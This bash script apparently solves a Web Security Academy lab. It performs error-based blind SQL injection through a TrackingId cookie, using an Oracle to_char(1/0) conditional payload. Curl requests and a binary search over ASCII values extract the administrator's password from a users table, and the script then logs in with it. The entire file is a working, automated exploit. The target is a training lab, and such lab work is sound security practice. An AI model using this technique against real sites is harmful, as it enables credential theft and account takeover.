#!/bin/bash

if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain"
	exit 1;
fi
url="https://$1.web-security-academy.net";

function check {
	sql="'||(SELECT CASE WHEN ($1) THEN to_char(1/0) ELSE '' END FROM dual)||'"
	res=$(curl -s -b "TrackingId=xyz$sql" "$2");
	[[ "$res" == "Internal Server Error" ]];
}

currentDir="$(dirname "$0")"

function binsearch {
	max=1;
	until check "$1 < $max" $2; do
		max=$((max*2));
	done
	min=0;
	ord=$((max + min));
	ord=$((ord / 2));
	until check "$1 = $ord" $2; do
		ord=$((max + min));
		ord=$((ord / 2));
		if check "$1 > $ord" $2; then
			min=$ord;
		else
			max=$ord;
		fi
	done
	echo $ord;
}
function searchstring {
	len=$(binsearch "(SELECT LENGTH($1) FROM users WHERE ROWNUM=$2)" "$3")
	i=1;
	while [[ $i -le $len ]]; do
		chr=$(binsearch "(SELECT ASCII(SUBSTR($1, $i, 1)) FROM users WHERE ROWNUM=$2)" $3)
		perl -e 'printf("%c", '$chr');';
		perl -e 'printf("%c", '$chr');' >&2;
		i=$((i+1))
	done
}

if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain"
	exit 1;
fi
echo "Dumping password for user 1 from $url"

targetUser="administrator"
password=$(searchstring "password" "1" "$url")

$currentDir/../lib/login.sh "$url" "$targetUser" "$(echo -ne "$password")";
